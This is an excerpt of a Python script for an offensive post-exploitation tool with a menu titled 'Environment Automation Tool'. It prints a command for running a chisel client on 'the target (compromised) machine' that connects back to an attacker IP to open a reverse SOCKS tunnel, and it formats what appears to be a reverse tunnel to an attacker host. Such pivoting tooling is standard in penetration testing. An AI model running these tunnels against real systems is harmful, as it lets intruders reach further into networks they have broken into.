...
[bold]On the target (compromised) machine, run:[/bold]
  ./chisel client {ip}:{port} R:{socks_port}:socks
""".format(ip=attacker_ip, port=chisel_port, socks_port=socks_port))
...
""".format(remote_port=remote_port, local_port=local_port, user=attacker_user, host=attacker_host))
...
def main_menu():
    ...
    while True:
        summarize_hosts(".")
        console.print("""
[bold blue]==== Environment Automation Tool ====[/bold blue]
